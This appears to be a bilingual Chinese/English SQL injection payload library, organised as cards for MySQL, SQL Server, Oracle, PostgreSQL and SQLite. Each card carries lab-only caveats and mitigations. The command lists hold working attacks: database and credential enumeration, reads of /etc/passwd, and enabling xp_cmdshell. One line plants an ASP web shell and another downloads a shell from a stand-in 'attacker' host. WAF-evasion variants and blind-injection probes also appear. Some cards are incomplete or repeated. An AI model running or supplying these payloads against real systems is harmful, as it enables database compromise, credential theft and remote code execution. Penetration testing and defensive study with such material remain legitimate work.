opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

name.zh: MySQL General Log 写入边界

description.zh: 将原混合条目中属于MySQL General Log 写入边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to MySQL General Log Write Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

subCategory.zh: MySQL General Log 写入边界

prerequisites.zh: 仅在隔离实例确认MySQL General Log 写入边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by MySQL General Log Write Boundary in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

title.zh: MySQL General Log 写入边界主验证命令
title.en: MySQL General Log Write Boundary Primary Validation

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

overview.zh: MySQL General Log 写入边界必须从原集合中独立判断，因为它有自己的语法、权限模型和副作用边界。命令按来源守恒，但只作为隔离实验输入。
overview.en: MySQL General Log Write Boundary must be evaluated independently because it has its own syntax, privilege model, and side-effect boundary. Source commands are conserved but remain isolated-lab inputs.

vulnerability.zh: 风险成立需要不可信输入到达MySQL General Log 写入边界对应语句，并在同一请求中越过预期绑定或权限边界。仅出现关键字、错误、对象名或权限拒绝均不能证明能力。
vulnerability.en: A finding requires untrusted input to reach the MySQL General Log Write Boundary statement and cross the intended binding or privilege boundary in the same request. Keywords, errors, object names, or denied privileges alone do not prove capability.

exploitation.zh: 先重放固定 marker 的阴性与阳性对照，再逐行测试本卡命令；涉及文件、进程、日志、网络或配置的来源值必须替换为一次性沙箱 fixture，并在首个充分证据后停止。
exploitation.en: Replay fixed-marker negative and positive controls before testing each card line. Replace source values involving files, processes, logs, networks, or configuration with disposable sandbox fixtures and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和固定操作映射，撤销应用角色不需要的高权限包、文件、网络、配置与执行能力，并在数据库审计中告警异常动态 SQL。
mitigation.en: Use parameterized queries and fixed operation mappings, revoke unneeded package, file, network, configuration, and execution privileges from the application role, and alert on abnormal dynamic SQL in database audit logs.

title.zh: 限定MySQL General Log 写入边界前提

description.en: Correlate the same marker across the application response, final SQL, privilege decision, and database audit event, excluding reflection, syntax errors, and other branches.

title.zh: SQL Server xp_cmdshell 能力边界主验证命令
title.en: SQL Server xp_cmdshell Capability Boundary Primary Validation

execution.command:
' UNION SELECT 1,OBJECT_ID('xp_cmdshell'),3--
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC master..xp_cmdshell 'net user'--
'; EXEC master..xp_cmdshell 'dir C:'--
'; EXEC master..xp_cmdshell 'echo ^<%execute(request("cmd"))^> > C:\inetpub\wwwroot\shell.asp'--
'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://attacker/shell.aspx C:\inetpub\wwwroot\shell.aspx'--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。

title.en: SQL Server xp_cmdshell Capability Boundary Controlled Variant

'; EXEC('EXEC master..xp_cmdshell ''whoami''')--
'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--

exploitation.zh: 先重放固定 marker 的阴性与阳性对照，再逐行测试本卡命令；涉及文件、进程、日志、网络或配置的来源值必须替换为一次性沙箱 fixture，并在首个充分证据后停止。
exploitation.en: Replay fixed-marker negative and positive controls before testing each card line. Replace source values involving files, processes, logs, networks, or configuration with disposable sandbox fixtures and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和固定操作映射，撤销应用角色不需要的高权限包、文件、网络、配置与执行能力，并在数据库审计中告警异常动态 SQL。
mitigation.en: Use parameterized queries and fixed operation mappings, revoke unneeded package, file, network, configuration, and execution privileges from the application role, and alert on abnormal dynamic SQL in database audit logs.

title.zh: 限定SQL Server OLE Automation 能力边界前提
title.en: Constrain SQL Server OLE Automation Capability Boundary prerequisites

description.zh: 确认SQL Server OLE Automation 能力边界对应的实现、版本、语句上下文、权限与隔离数据均已记录。
description.en: Record the implementation, version, statement context, privileges, and isolated data required by SQL Server OLE Automation Capability Boundary.

title.zh: 提交SQL Server OLE Automation 能力边界主命令
title.en: Submit the SQL Server OLE Automation Capability Boundary primary command

description.zh: 仅提交 execution[0] 的审校命令组，并为本次请求绑定唯一 marker 与数据库审计标识。
description.en: Submit only the reviewed execution[0] command group and bind a unique marker and database audit identifier to the request.

title.zh: 关联SQL Server OLE Automation 能力边界证据
title.en: Correlate SQL Server OLE Automation Capability Boundary evidence

description.zh: 把同一 marker 的应用响应、最终 SQL、权限判定和数据库审计事件关联，排除回显、语法错误和其他分支。
description.en: Correlate the same marker across the application response, final SQL, privilege decision, and database audit event, excluding reflection, syntax errors, and other branches.

title.zh: 收敛SQL Server OLE Automation 能力边界能力
title.en: Contain the SQL Server OLE Automation Capability Boundary capability

description.zh: 撤销测试权限与临时对象，恢复参数化和最小权限配置，再重放阴性与正常业务基线。
description.en: Revoke test privileges and temporary objects, restore parameterization and least privilege, then replay negative and normal business baselines.

analysis.zh: SQL Server OLE Automation 能力边界的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive SQL Server OLE Automation Capability Boundary evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

name.zh: Oracle UNION 枚举语义

description.zh: 将原混合条目中属于Oracle UNION 枚举语义的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to Oracle UNION Enumeration Semantics into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

prerequisites.zh: 仅在隔离实例确认Oracle UNION 枚举语义所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by Oracle UNION Enumeration Semantics in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

title.zh: Oracle UNION 枚举语义主验证命令
title.en: Oracle UNION Enumeration Semantics Primary Validation

execution.command:
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL FROM DUAL--
' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--
' UNION SELECT version,NULL FROM v$instance--
' UNION SELECT username,NULL FROM all_users--
' UNION SELECT user,NULL FROM DUAL--
' UNION SELECT SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM DUAL--
' UNION SELECT table_name,NULL FROM all_tables WHERE owner='SCOTT'--
' UNION SELECT owner||'.'||table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT column_name||':'||data_type,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT username||':'||password,NULL FROM users--
' UNION SELECT * FROM (SELECT username,password FROM users) WHERE rownum<=1--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

overview.zh: Oracle UNION 枚举语义必须从原集合中独立判断，因为它有自己的语法、权限模型和副作用边界。命令按来源守恒，但只作为隔离实验输入。
overview.en: Oracle UNION Enumeration Semantics must be evaluated independently because it has its own syntax, privilege model, and side-effect boundary. Source commands are conserved but remain isolated-lab inputs.

vulnerability.zh: 风险成立需要不可信输入到达Oracle UNION 枚举语义对应语句，并在同一请求中越过预期绑定或权限边界。仅出现关键字、错误、对象名或权限拒绝均不能证明能力。

title.zh: Oracle DBMS_JAVA 包能力可见性主验证命令
title.en: Oracle DBMS_JAVA Package Capability Visibility Primary Validation

execution.command:
' UNION SELECT 1,CASE WHEN EXISTS (SELECT 1 FROM ALL_OBJECTS WHERE OWNER='SYS' AND OBJECT_NAME='DBMS_JAVA' AND OBJECT_TYPE='PACKAGE') THEN 'PACKAGE_PRESENT' ELSE 'PACKAGE_ABSENT' END FROM DUAL-- -
' UNION SELECT 1,CASE WHEN EXISTS (SELECT 1 FROM ALL_TAB_PRIVS WHERE OWNER='SYS' AND TABLE_NAME='DBMS_JAVA' AND PRIVILEGE='EXECUTE' AND GRANTEE IN (USER,'PUBLIC')) THEN 'EXECUTE_GRANTED' ELSE 'EXECUTE_NOT_GRANTED' END FROM DUAL-- -

name.zh: Oracle UTL_FILE Marker 能力

description.zh: 将原混合条目中属于Oracle UTL_FILE Marker 能力的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to Oracle UTL_FILE Marker Capability into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

prerequisites.zh: 仅在隔离实例确认Oracle UTL_FILE Marker 能力所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by Oracle UTL_FILE Marker Capability in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

title.zh: Oracle UTL_FILE Marker 能力主验证命令
title.en: Oracle UTL_FILE Marker Capability Primary Validation

execution.command: DECLARE v_exists BOOLEAN; v_length NUMBER; v_block_size BINARY_INTEGER; BEGIN UTL_FILE.FGETATTR('PAYLOADER_SANDBOX_DIR','PAYLOADER_MARKER.txt',v_exists,v_length,v_block_size); IF v_exists THEN DBMS_OUTPUT.PUT_LINE('PAYLOADER_MARKER_PRESENT'); ELSE DBMS_OUTPUT.PUT_LINE('PAYLOADER_MARKER_ABSENT'); END IF; END;

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

overview.zh: Oracle UTL_FILE Marker 能力必须从原集合中独立判断，因为它有自己的语法、权限模型和副作用边界。命令按来源守恒，但只作为隔离实验输入。
overview.en: Oracle UTL_FILE Marker Capability must be evaluated independently because it has its own syntax, privilege model, and side-effect boundary. Source commands are conserved but remain isolated-lab inputs.

vulnerability.zh: 风险成立需要不可信输入到达Oracle UTL_FILE Marker 能力对应语句，并在同一请求中越过预期绑定或权限边界。仅出现关键字、错误、对象名或权限拒绝均不能证明能力。
vulnerability.en: A finding requires untrusted input to reach the Oracle UTL_FILE Marker Capability statement and cross the intended binding or privilege boundary in the same request. Keywords, errors, object names, or denied privileges alone do not prove capability.

exploitation.zh: 先重放固定 marker 的阴性与阳性对照，再逐行测试本卡命令；涉及文件、进程、日志、网络或配置的来源值必须替换为一次性沙箱 fixture，并在首个充分证据后停止。
exploitation.en: Replay fixed-marker negative and positive controls before testing each card line. Replace source values involving files, processes, logs, networks, or configuration with disposable sandbox fixtures and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和固定操作映射，撤销应用角色不需要的高权限包、文件、网络、配置与执行能力，并在数据库审计中告警异常动态 SQL。
mitigation.en: Use parameterized queries and fixed operation mappings, revoke unneeded package, file, network, configuration, and execution privileges from the application role, and alert on abnormal dynamic SQL in database audit logs.

title.zh: 限定Oracle UTL_FILE Marker 能力前提
title.en: Constrain Oracle UTL_FILE Marker Capability prerequisites

description.zh: 确认Oracle UTL_FILE Marker 能力对应的实现、版本、语句上下文、权限与隔离数据均已记录。
description.en: Record the implementation, version, statement context, privileges, and isolated data required by Oracle UTL_FILE Marker Capability.

title.zh: 提交Oracle UTL_FILE Marker 能力主命令
title.en: Submit the Oracle UTL_FILE Marker Capability primary command

description.zh: 仅提交 execution[0] 的审校命令组，并为本次请求绑定唯一 marker 与数据库审计标识。
description.en: Submit only the reviewed execution[0] command group and bind a unique marker and database audit identifier to the request.

title.zh: 关联Oracle UTL_FILE Marker 能力证据
title.en: Correlate Oracle UTL_FILE Marker Capability evidence

description.zh: 把同一 marker 的应用响应、最终 SQL、权限判定和数据库审计事件关联，排除回显、语法错误和其他分支。
description.en: Correlate the same marker across the application response, final SQL, privilege decision, and database audit event, excluding reflection, syntax errors, and other branches.

title.zh: 收敛Oracle UTL_FILE Marker 能力能力
title.en: Contain the Oracle UTL_FILE Marker Capability capability

description.zh: 撤销测试权限与临时对象，恢复参数化和最小权限配置，再重放阴性与正常业务基线。
description.en: Revoke test privileges and temporary objects, restore parameterization and least privilege, then replay negative and normal business baselines.

analysis.zh: Oracle UTL_FILE Marker 能力的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive Oracle UTL_FILE Marker Capability evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

title.zh: Oracle 表达式与编码变体主验证命令
title.en: Oracle Expression and Encoding Variants Primary Validation

execution.command:
' UNION SELECT 1,XMLType('<root><data>PAYLOADER_MARKER</data></root>') FROM DUAL-- -
' UNION SELECT 1,CASE WHEN USER IS NOT NULL THEN 'PAYLOADER_MARKER' ELSE 'NO_MARKER' END FROM DUAL-- -
' UNION/**/SELECT/**/1,user/**/FROM/**/DUAL--
' UNION SELECT 1,CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78) FROM DUAL--
' UNION SELECT 1,RAWTOHEX(user) FROM DUAL--
' UNION SELECT 1,UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(user))) FROM DUAL--

title.en: PostgreSQL UNION and Catalog Enumeration Primary Validation

execution.command:
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT version(),NULL--
' UNION SELECT current_database(),NULL--
' UNION SELECT current_user,NULL--
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

title.en: Constrain PostgreSQL UNION and Catalog Enumeration prerequisites

description.en: Record the implementation, version, statement context, privileges, and isolated data required by PostgreSQL UNION and Catalog Enumeration.

title.zh: 提交PostgreSQL UNION 与目录枚举主命令
title.en: Submit the PostgreSQL UNION and Catalog Enumeration primary command

description.zh: 仅提交 execution[0] 的审校命令组，并为本次请求绑定唯一 marker 与数据库审计标识。
description.en: Submit only the reviewed execution[0] command group and bind a unique marker and database audit identifier to the request.

title.zh: 对照PostgreSQL UNION 与目录枚举变体
title.en: Compare the PostgreSQL UNION and Catalog Enumeration variant

description.zh: 仅在主路径已建立基线后使用 wafBypass[0]，并逐层记录解码、解析与最终语句。
description.en: Use wafBypass[0] only after the primary path has a baseline, recording decoding, parsing, and the final statement at every layer.

title.zh: 关联PostgreSQL UNION 与目录枚举证据
title.en: Correlate PostgreSQL UNION and Catalog Enumeration evidence

description.zh: 把同一 marker 的应用响应、最终 SQL、权限判定和数据库审计事件关联，排除回显、语法错误和其他分支。
description.en: Correlate the same marker across the application response, final SQL, privilege decision, and database audit event, excluding reflection, syntax errors, and other branches.

title.zh: 收敛PostgreSQL UNION 与目录枚举能力
title.en: Contain the PostgreSQL UNION and Catalog Enumeration capability

description.zh: 撤销测试权限与临时对象，恢复参数化和最小权限配置，再重放阴性与正常业务基线。
description.en: Revoke test privileges and temporary objects, restore parameterization and least privilege, then replay negative and normal business baselines.

analysis.zh: PostgreSQL UNION 与目录枚举的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive PostgreSQL UNION and Catalog Enumeration evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

name.zh: PostgreSQL 服务端文件读取边界

description.zh: 将原混合条目中属于PostgreSQL 服务端文件读取边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to PostgreSQL Server-File Read Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

subCategory.zh: PostgreSQL 服务端文件读取边界

prerequisites.zh: 仅在隔离实例确认PostgreSQL 服务端文件读取边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by PostgreSQL Server-File Read Boundary in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

title.zh: PostgreSQL 服务端文件读取边界主验证命令
title.en: PostgreSQL Server-File Read Boundary Primary Validation

execution.command:
' UNION SELECT pg_read_file('/etc/passwd'),NULL--
' UNION SELECT pg_read_binary_file('/etc/passwd'),NULL--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

overview.zh: PostgreSQL 服务端文件读取边界必须从原集合中独立判断，因为它有自己的语法、权限模型和副作用边界。命令按来源守恒，但只作为隔离实验输入。
overview.en: PostgreSQL Server-File Read Boundary must be evaluated independently because it has its own syntax, privilege model, and side-effect boundary. Source commands are conserved but remain isolated-lab inputs.

vulnerability.zh: 风险成立需要不可信输入到达PostgreSQL 服务端文件读取边界对应语句，并在同一请求中越过预期绑定或权限边界。仅出现关键字、错误、对象名或权限拒绝均不能证明能力。
vulnerability.en: A finding requires untrusted input to reach the PostgreSQL Server-File Read Boundary statement and cross the intended binding or privilege boundary in the same request. Keywords, errors, object names, or denied privileges alone do not prove capability.

exploitation.zh: 先重放固定 marker 的阴性与阳性对照，再逐行测试本卡命令；涉及文件、进程、日志、网络或配置的来源值必须替换为一次性沙箱 fixture，并在首个充分证据后停止。
exploitation.en: Replay fixed-marker negative and positive controls before testing each card line. Replace source values involving files, processes, logs, networks, or configuration with disposable sandbox fixtures and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和固定操作映射，撤销应用角色不需要的高权限包、文件、网络、配置与执行能力，并在数据库审计中告警异常动态 SQL。
mitigation.en: Use parameterized queries and fixed operation mappings, revoke unneeded package, file, network, configuration, and execution privileges from the application role, and alert on abnormal dynamic SQL in database audit logs.

description.en: Routes every source line belonging to SQLite UNION and sqlite_master Enumeration into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

subCategory.zh: SQLite UNION 与 sqlite_master 枚举

prerequisites.zh: 仅在隔离实例确认SQLite UNION 与 sqlite_master 枚举所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。

title.zh: SQLite UNION 与 sqlite_master 枚举主验证命令
title.en: SQLite UNION and sqlite_master Enumeration Primary Validation

execution.command:
' OR 1=1--
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT sqlite_version(),NULL--
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

title.zh: SQLite UNION 与 sqlite_master 枚举受控变体
title.en: SQLite UNION and sqlite_master Enumeration Controlled Variant

wafBypass.command:
' UNION SELECT CHAR(116,101,115,116),NULL--
' UNION SELECT X'746573746461746131',NULL--
' AND typeof(CASE WHEN unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>96 THEN 1 ELSE 0.0 END)='integer'--
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%user%')--
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name GLOB '*user*')--
' UNION SELECT replace(group_concat(name,','),'_',''),NULL FROM sqlite_master WHERE type='table'--
' AND instr((SELECT sql FROM sqlite_master LIMIT 1),'password')>0--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

subCategory.zh: SQLite 扩展与文件函数边界

prerequisites.zh: 仅在隔离实例确认SQLite 扩展与文件函数边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by SQLite Extension and File-Function Boundary in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

title.zh: SQLite 扩展与文件函数边界主验证命令
title.en: SQLite Extension and File-Function Boundary Primary Validation

execution.command:
' UNION SELECT load_extension('libsqlite3.so'),NULL--
' UNION SELECT readfile('/etc/passwd'),NULL--

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
description.en: These lines are conserved exactly from the reviewed source. Before execution, replace real accounts, files, network targets, and system commands with isolated markers and run only in an authorized lab.

overview.zh: SQLite 扩展与文件函数边界必须从原集合中独立判断，因为它有自己的语法、权限模型和副作用边界。命令按来源守恒，但只作为隔离实验输入。
overview.en: SQLite Extension and File-Function Boundary must be evaluated independently because it has its own syntax, privilege model, and side-effect boundary. Source commands are conserved but remain isolated-lab inputs.

vulnerability.zh: 风险成立需要不可信输入到达SQLite 扩展与文件函数边界对应语句，并在同一请求中越过预期绑定或权限边界。仅出现关键字、错误、对象名或权限拒绝均不能证明能力。
vulnerability.en: A finding requires untrusted input to reach the SQLite Extension and File-Function Boundary statement and cross the intended binding or privilege boundary in the same request. Keywords, errors, object names, or denied privileges alone do not prove capability.

exploitation.zh: 先重放固定 marker 的阴性与阳性对照，再逐行测试本卡命令；涉及文件、进程、日志、网络或配置的来源值必须替换为一次性沙箱 fixture，并在首个充分证据后停止。
exploitation.en: Replay fixed-marker negative and positive controls before testing each card line. Replace source values involving files, processes, logs, networks, or configuration with disposable sandbox fixtures and stop after the first sufficient proof.

mitigation.zh: 使用参数化查询和固定操作映射，撤销应用角色不需要的高权限包、文件、网络、配置与执行能力，并在数据库审计中告警异常动态 SQL。
mitigation.en: Use parameterized queries and fixed operation mappings, revoke unneeded package, file, network, configuration, and execution privileges from the application role, and alert on abnormal dynamic SQL in database audit logs.

title.zh: 限定SQLite 扩展与文件函数边界前提
title.en: Constrain SQLite Extension and File-Function Boundary prerequisites

description.zh: 确认SQLite 扩展与文件函数边界对应的实现、版本、语句上下文、权限与隔离数据均已记录。
description.en: Record the implementation, version, statement context, privileges, and isolated data required by SQLite Extension and File-Function Boundary.

title.zh: 提交SQLite 扩展与文件函数边界主命令
title.en: Submit the SQLite Extension and File-Function Boundary primary command

description.zh: 仅提交 execution[0] 的审校命令组，并为本次请求绑定唯一 marker 与数据库审计标识。
description.en: Submit only the reviewed execution[0] command group and bind a unique marker and database audit identifier to the request.

title.zh: 关联SQLite 扩展与文件函数边界证据
title.en: Correlate SQLite Extension and File-Function Boundary evidence

description.zh: 把同一 marker 的应用响应、最终 SQL、权限判定和数据库审计事件关联，排除回显、语法错误和其他分支。
description.en: Correlate the same marker across the application response, final SQL, privilege decision, and database audit event, excluding reflection, syntax errors, and other branches.

title.zh: 收敛SQLite 扩展与文件函数边界能力
title.en: Contain the SQLite Extension and File-Function Boundary capability

description.zh: 撤销测试权限与临时对象，恢复参数化和最小权限配置，再重放阴性与正常业务基线。
description.en: Revoke test privileges and temporary objects, restore parameterization and least privilege, then replay negative and normal business baselines.

analysis.zh: SQLite 扩展与文件函数边界的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive SQLite Extension and File-Function Boundary evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

name.zh: 固定 Marker 布尔盲注差分

description.zh: 将原混合条目中属于固定 Marker 布尔盲注差分的每一行独立路由，明确语法或载体前提、证据链与假阳性边界。
description.en: Routes every source line belonging to Fixed-Marker Boolean Blind Differential into one focused card with explicit syntax or carrier prerequisites, evidence chains, and false-positive boundaries.

subCategory.zh: 固定 Marker 布尔盲注差分

prerequisites.zh: 仅在隔离实例确认固定 Marker 布尔盲注差分所需 DBMS、驱动、代理或解析器行为，不跨技术分支推断结果。
prerequisites.en: Confirm the DBMS, driver, proxy, or parser behavior required by Fixed-Marker Boolean Blind Differential in an isolated instance and do not infer results across technique branches.

prerequisites.zh: 准备固定 PAYLOADER_MARKER、阴性/阳性对照、最终语句或原始字节日志及短超时；真实数据和生产流量不得使用。
prerequisites.en: Prepare a fixed PAYLOADER_MARKER, negative and positive controls, final-statement or raw-byte logs, and short timeouts; do not use real data or production traffic.

title.zh: 固定 Marker 布尔盲注差分主验证命令
title.en: Fixed-Marker Boolean Blind Differential Primary Validation

execution.command:
' AND 1=1-- -
' AND 1=2-- -
' AND 'PAYLOADER_MARKER'='PAYLOADER_MARKER'-- -
' AND LENGTH('PAYLOADER_MARKER')=1-- -
' AND LENGTH('PAYLOADER_MARKER')=2-- -
' AND LENGTH('PAYLOADER_MARKER')=4-- -
' AND LENGTH('PAYLOADER_MARKER')=8-- -
' AND LENGTH('PAYLOADER_MARKER')=16-- -
' AND ASCII(SUBSTRING('PAYLOADER_MARKER',1,1))>64-- -
' AND ASCII(SUBSTRING('PAYLOADER_MARKER',1,1))>96-- -
' AND ASCII(SUBSTRING('PAYLOADER_MARKER',1,1))>112-- -
' AND ASCII(SUBSTRING('PAYLOADER_MARKER',1,1))>126-- -

description.zh: 这些行按审校后的来源逐行守恒；执行前必须把真实账户、文件、网络目标和系统命令替换为隔离 marker，并只在授权实验环境运行。
